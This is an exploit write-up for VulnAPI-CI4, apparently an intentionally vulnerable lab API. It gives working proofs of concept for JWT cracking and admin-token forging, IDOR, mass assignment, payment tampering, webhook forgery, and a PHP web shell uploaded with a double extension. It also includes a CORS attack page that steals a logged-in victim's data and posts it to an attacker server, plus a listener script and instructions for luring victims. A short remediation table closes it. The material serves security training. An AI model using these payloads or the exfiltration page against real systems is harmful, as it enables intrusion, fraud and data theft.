# VulnAPI-CI4 Exploit Writeup üîì

This document contains detailed Proof-of-Concept (PoC) exploits for all intentional vulnerabilities in VulnAPI-CI4.

> **Note:** All examples show both **Linux** and **Windows** commands. Replace `YOUR_TOKEN` with an actual JWT token obtained from the login endpoint.
>
> **‚ö†Ô∏è Windows Users:** Use **Command Prompt (cmd.exe)**, NOT PowerShell. If you must use PowerShell, type `curl.exe` instead of `curl` (PowerShell's `curl` is an alias for a different command).
>
> **üì° Endpoint Reference:** See the main [README.md](../README.md#-api-endpoints) for a full list of all API endpoints.

## Table of Contents
1. [JWT Cracking](#1-jwt-cracking-api2)
2. [IDOR Exploitation](#2-idor-exploitation-api1)
3. [Mass Assignment](#3-mass-assignment-api3)
4. [Broken Function-Level Authorization](#4-broken-function-level-authorization-api5)
5. [Payment Price Tampering](#5-payment-price-tampering)
6. [Webhook Forgery](#6-webhook-forgery)
7. [Insecure File Upload ‚Üí RCE](#7-insecure-file-upload--rce)
8. [Privilege Escalation via JWT](#8-privilege-escalation-via-jwt)
9. [CORS Bypass](#9-cors-misconfiguration)
10. [Information Disclosure](#10-information-disclosure)

---

## Getting a Token (Required for Most Exploits)

Before running most exploits, you need a JWT token. Here's how to get one:

**Linux:**
```
curl -X POST http://localhost:8080/api/auth/login -H "Content-Type: application/json" -d '{"email": "userA@acme.com", "password": "password123"}'
```

**Windows (Command Prompt):**
```
curl -X POST http://localhost:8080/api/auth/login -H "Content-Type: application/json" -d "{\"email\":\"userA@acme.com\",\"password\":\"password123\"}"
```

**Windows (PowerShell):**
```
curl.exe -X POST http://localhost:8080/api/auth/login -H "Content-Type: application/json" -d '{\"email\":\"userA@acme.com\",\"password\":\"password123\"}'
```

**Response:**
```json
{
  "status": "success",
  "data": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
    "user": { "id": 1, "email": "userA@acme.com", "role": "user", "org_id": 1 }
  }
}
```

Copy the `token` value from the response. This is your `YOUR_TOKEN` for the examples below.

---

## 1. JWT Cracking (API2)

### Vulnerability
The JWT is signed with a weak secret: `"secret"`

### PoC: Crack the JWT Secret

**Step 1: Get a valid JWT** (see above)

**Step 2: Crack with Hashcat**

Save your token to a file called `jwt.txt`, then run:
```
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

Or use jwt-cracker (Node.js):
```
npm install -g jwt-cracker
jwt-cracker "eyJ0eXAiOiJKV1QiLC..." "abcdefghijklmnopqrstuvwxyz" 6
```

**Step 3: Verify the secret**
```python
# verify_secret.py
import jwt

token = "YOUR_TOKEN_HERE"
secret = "secret"

try:
    decoded = jwt.decode(token, secret, algorithms=["HS256"])
    print("SUCCESS! Secret is:", secret)
    print("Decoded payload:", decoded)
except jwt.InvalidSignatureError:
    print("Wrong secret")
```

### Impact
- Attacker can forge any JWT
- Create admin tokens
- Impersonate any user

---

## 2. IDOR Exploitation (API1)

### Vulnerability
`GET /api/vehicles/{id}` requires authentication (a valid JWT token), but does NOT check if the authenticated user is authorized to view that specific vehicle. Any authenticated user can access ANY vehicle by changing the ID, regardless of which organization they belong to.

### PoC: Access Another Organization's Vehicle

**Step 1:** Login as userA (belongs to org 1) and get a token (see "Getting a Token" above)

**Step 2:** Use that token to access vehicle ID 3 (which belongs to org 2, not org 1)

**Linux:**
```
curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:8080/api/vehicles/3
```

**Windows:**
```
curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:8080/api/vehicles/3
```

**Result:** Even though userA is in org 1, they can see org 2's vehicle data.

**Step 3:** Try other IDs to enumerate all vehicles (1, 2, 3, 4, 5, etc.)

### Impact
- View confidential vehicle data across organizations
- Access pricing information
- Enumerate all resources in the system

---

## 3. Mass Assignment (API3)

### Vulnerability
Vehicle creation/update accepts any field, including sensitive ones like `org_id`, `owner_user_id`, and `price`.

### PoC: Create Vehicle in Another Organization

As userA (org 1), create a vehicle assigned to org 2:

**Linux:**
```
curl -X POST http://localhost:8080/api/vehicles -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"make": "Hacked", "model": "Vehicle", "year": 2024, "price": 1, "org_id": 2, "owner_user_id": 2}'
```

**Windows:**
```
curl -X POST http://localhost:8080/api/vehicles -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d "{\"make\":\"Hacked\",\"model\":\"Vehicle\",\"year\":2024,\"price\":1,\"org_id\":2,\"owner_user_id\":2}"
```

### PoC: Modify Vehicle Price

**Linux:**
```
curl -X PATCH http://localhost:8080/api/vehicles/5 -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"price": 1.00}'
```

**Windows:**
```
curl -X PATCH http://localhost:8080/api/vehicles/5 -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d "{\"price\":1.00}"
```

### Impact
- Create resources in other organizations
- Modify ownership of resources
- Manipulate pricing data

---

## 4. Broken Function-Level Authorization (API5)

### Vulnerability
Admin endpoints don't verify the user's role.

### PoC: Access Admin Endpoint as Regular User

**Step 1:** Login as userA (a regular user, not admin) and get a token

**Step 2:** Access the admin-only endpoint

**Linux:**
```
curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:8080/api/admin/users
```

**Windows:**
```
curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:8080/api/admin/users
```

**Result:** You can see all users even though you're not an admin!

### PoC: Access Stats Without Any Auth

**Linux/Windows:**
```
curl http://localhost:8080/api/admin/stats
```

No token needed at all!

### Impact
- View all users in the system
- Access admin dashboards
- Gather intelligence for further attacks

---

## 5. Payment Price Tampering

### Vulnerability
The checkout endpoint accepts client-provided `amount` instead of using server-side price.

### PoC: Buy a Vehicle for $0.01

**Step 1:** Check a vehicle's price (use vehicle ID 1 or any vehicle you haven't modified)

**Linux/Windows:**
```
curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:8080/api/vehicles/1
```

Note the actual price from the response.

**Step 2:** Create payment with a tampered (much lower) price

**Linux:**
```
curl -X POST http://localhost:8080/api/payments/checkout -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"vehicle_id": 1, "amount": 0.01}'
```

**Windows:**
```
curl -X POST http://localhost:8080/api/payments/checkout -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d "{\"vehicle_id\":1,\"amount\":0.01}"
```

**Response:**
```json
{
  "status": "success",
  "data": {
    "original_price": "25000.00",
    "charged_amount": 0.01,
    "message": "Payment initiated successfully"
  }
}
```

The `charged_amount` is $0.01 even though `original_price` was much higher!

### Impact
- Purchase items at arbitrary prices
- Financial fraud
- Business logic bypass

---

## 6. Webhook Forgery

### Vulnerability
The webhook endpoint has no signature validation or replay protection.

### PoC: Force Payment to "Paid" Status

**Step 1:** Create a pending payment (see Payment Price Tampering above) and note the payment ID from the response

**Step 2:** Forge a webhook to mark it as paid (replace `5` with your payment ID)

**Linux:**
```
curl -X POST http://localhost:8080/api/payments/webhook -H "Content-Type: application/json" -d '{"event": "payment.completed", "payment_id": 5, "status": "paid"}'
```

**Windows:**
```
curl -X POST http://localhost:8080/api/payments/webhook -H "Content-Type: application/json" -d "{\"event\":\"payment.completed\",\"payment_id\":5,\"status\":\"paid\"}"
```

**Step 3:** Verify payment is now "paid"

**Linux/Windows:**
```
curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:8080/api/payments/5
```

### Impact
- Mark orders as paid without paying
- Bypass payment verification
- Manipulate transaction states

---

## 7. Insecure File Upload ‚Üí RCE

### Vulnerability
File upload only checks the **final** extension via blocklist. This can be bypassed using a **double extension** like `shell.php.jpg`. The Nginx config is misconfigured to execute any file in `/uploads/` containing `.php` in the filename.

**Blocked extensions:** `php, phtml, php3, php4, php5, php7, phar`

**Bypass:** Use `shell.php.jpg` ‚Äî the code checks only the final extension (`jpg`), which passes the blocklist.

### PoC: Upload PHP Web Shell

**Step 1:** Create a file called `shell.php.jpg` with this content:
```php
<?php system($_GET["cmd"]); ?>
```

**Step 2:** Upload it

**Linux:**
```
curl -X POST http://localhost:8080/api/uploads -H "Authorization: Bearer YOUR_TOKEN" -F "file=@shell.php.jpg"
```

**Windows:**
```
curl -X POST http://localhost:8080/api/uploads -H "Authorization: Bearer YOUR_TOKEN" -F "file=@shell.php.jpg"
```

**Expected response:**
```json
{
  "status": "success",
  "data": {
    "message": "File uploaded successfully",
    "filename": "shell.php.jpg",
    "url": "http://localhost:8080/uploads/shell.php.jpg"
  }
}
```

**Step 3:** Execute commands via the uploaded shell

**Linux/Windows:**
```
curl "http://localhost:8080/uploads/shell.php.jpg?cmd=whoami"
curl "http://localhost:8080/uploads/shell.php.jpg?cmd=id"
curl "http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20-la"
```

### Impact
- Remote Code Execution on server
- Full server compromise
- Data exfiltration
- Lateral movement within the network

---

## 8. Privilege Escalation via JWT

### Vulnerability
Once the JWT secret is cracked (it's `"secret"`), an attacker can forge tokens with any role, including `admin`. This bypasses role-based access controls.

**Key difference from Exploit 4:**
- Exploit 4: `GET /api/admin/users` has NO role check (any authenticated user can access)
- Exploit 8: `DELETE /api/admin/users/{id}` HAS a role check (only admin can delete users)

### PoC: Bypass Role Check with Forged Admin Token

**Step 1:** Try to delete a user with a regular user token (this will FAIL):

**Linux:**
```
curl -X DELETE -H "Authorization: Bearer YOUR_REGULAR_TOKEN" http://localhost:8080/api/admin/users/2
```

**Windows:**
```
curl -X DELETE -H "Authorization: Bearer YOUR_REGULAR_TOKEN" http://localhost:8080/api/admin/users/2
```

**Response:** `{"status":"error","message":"Admin access required","code":"FORBIDDEN"}`

**Step 2:** Forge an admin token using the cracked secret:

```python
# forge_admin_jwt.py
import jwt
import time

secret = "secret"  # Cracked in Exploit 1

payload = {
    "user_id": 999,
    "email": "attacker@evil.com",
    "role": "admin",  # Escalate to admin!
    "org_id": 1,
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400,
    "iss": "vulnapi"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Forged admin token: {token}")
```

**Step 3:** Use the forged token to delete a user (this will SUCCEED):

**Linux:**
```
curl -X DELETE -H "Authorization: Bearer FORGED_ADMIN_TOKEN" http://localhost:8080/api/admin/users/2
```

**Windows:**
```
curl -X DELETE -H "Authorization: Bearer FORGED_ADMIN_TOKEN" http://localhost:8080/api/admin/users/2
```

**Response:** `{"status":"success","data":{"message":"User deleted successfully","deleted_user_id":"2"}}`

### Alternative: Register with Admin Role (Mass Assignment)

The register endpoint accepts `role` from the client, so you can create an admin account directly:

**Linux:**
```
curl -X POST http://localhost:8080/api/auth/register -H "Content-Type: application/json" -d '{"email": "newadmin@evil.com", "password": "hacked123", "role": "admin"}'
```

**Windows:**
```
curl -X POST http://localhost:8080/api/auth/register -H "Content-Type: application/json" -d "{\"email\":\"newadmin@evil.com\",\"password\":\"hacked123\",\"role\":\"admin\"}"
```

### Impact
- Bypass role-based access controls
- Delete any user from the system
- Impersonate any user by forging their user_id
- Create admin accounts without authorization

---

## 9. CORS Misconfiguration

### Vulnerability
API returns `Access-Control-Allow-Origin: *` allowing any website to make requests to the API. This means a malicious website can steal data from users who are logged into VulnAPI.

### How It Works

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê     1. Victim visits      ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Victim    ‚îÇ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫  ‚îÇ  Your Server    ‚îÇ
‚îÇ  (Browser)  ‚îÇ                           ‚îÇ  (evil.html)    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                           ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
       ‚îÇ                                          ‚îÇ
       ‚îÇ  2. Malicious JS runs in browser         ‚îÇ
       ‚ñº                                          ‚îÇ
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                                   ‚îÇ
‚îÇ  VulnAPI    ‚îÇ ‚óÑ‚îÄ‚îÄ 3. JS fetches data            ‚îÇ
‚îÇ             ‚îÇ                                   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                                   ‚îÇ
       ‚îÇ                                          ‚îÇ
       ‚îÇ  4. Stolen data sent to your server      ‚îÇ
       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### PoC: Complete Setup

**Step 1: Create the malicious page**

Create a file called `evil.html` on your attacker machine (e.g., Kali):

```html
<!DOCTYPE html>
<html>
<head><title>Win a Prize!</title></head>
<body>
<h1>Congratulations! Click to claim your prize!</h1>
<p id="status">Loading...</p>
<script>
// Replace with the IP where VulnAPI is running
var VULNAPI_URL = 'http://192.168.1.100:8080';

// Replace with YOUR attacker machine IP
var ATTACKER_URL = 'http://192.168.1.50:8888';

// Steal vehicle data
fetch(VULNAPI_URL + '/api/vehicles', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    document.getElementById('status').innerText = 'Processing your prize...';
    console.log('Stolen data:', data);
    
    // Send stolen data to attacker's server
    fetch(ATTACKER_URL + '/stolen', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    });
})
.catch(err => {
    console.log('Error:', err);
});
</script>
</body>
</html>
```

**Step 2: Start a listener on your attacker machine (Kali)**

Option A - Simple Python HTTP server (to see requests):
```bash
# On Kali - start a simple server to host evil.html AND receive data
python3 -m http.server 8888
```

Option B - Netcat (raw listener to see POST data):
```bash
# On Kali - listen for incoming connections
nc -lvnp 8888
```

Option C - Python script to capture and display stolen data:
```python
# save as steal_server.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json

class StealHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print("\n[!] STOLEN DATA RECEIVED:")
        print("-" * 50)
        try:
            data = json.loads(post_data)
            print(json.dumps(data, indent=2))
        except:
            print(post_data.decode())
        print("-" * 50)
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        return SimpleHTTPRequestHandler.do_GET(self)

print("[*] Starting steal server on port 8888...")
print("[*] Host evil.html and wait for victims!")
HTTPServer(('0.0.0.0', 8888), StealHandler).serve_forever()
```

Run it:
```bash
python3 steal_server.py
```

**Step 3: Get the victim to visit your page**

Send the victim a link to your malicious page:
```
http://YOUR_KALI_IP:8888/evil.html
```

When they open it in their browser, if they have a session with VulnAPI, their data will be sent to your server!

**Step 4: View the stolen data**

In your terminal, you'll see the stolen data appear when a victim visits your page.

### Why This Works

The VulnAPI returns this header on all responses:
```
Access-Control-Allow-Origin: *
```

This tells browsers: "Any website can make requests to me." Normally, browsers block cross-origin requests for security, but this header disables that protection.

### Impact
- Steal data from any logged-in user
- Perform actions on behalf of the victim
- Complete account takeover if combined with other vulnerabilities

---

## 10. Information Disclosure

### Vulnerability
Debug endpoint exposes sensitive system information.

### PoC: Gather System Intelligence

**Linux/Windows:**
```
curl http://localhost:8080/api/debug/info
```

No authentication required!

**Exposed information:**
- PHP version and extensions
- Server OS and hostname
- Database configuration
- File paths
- JWT algorithm and secret length
- Memory usage

### Impact
- Reconnaissance for further attacks
- Identify vulnerable software versions
- Map application architecture

---

## üõ°Ô∏è Remediation Summary

| Vulnerability | Fix |
|--------------|-----|
| Weak JWT Secret | Use cryptographically random 256-bit secret |
| IDOR | Always verify resource ownership before access |
| Mass Assignment | Whitelist allowed fields, never trust client input |
| Broken Auth | Implement proper RBAC, verify roles on each request |
| Price Tampering | Calculate prices server-side, never trust client |
| Webhook Forgery | Implement HMAC signature verification |
| File Upload | Validate content-type, magic bytes, store outside webroot |
| CORS | Whitelist specific trusted origins |
| Info Disclosure | Disable debug endpoints in production |

---

**Happy Hacking! üîê**
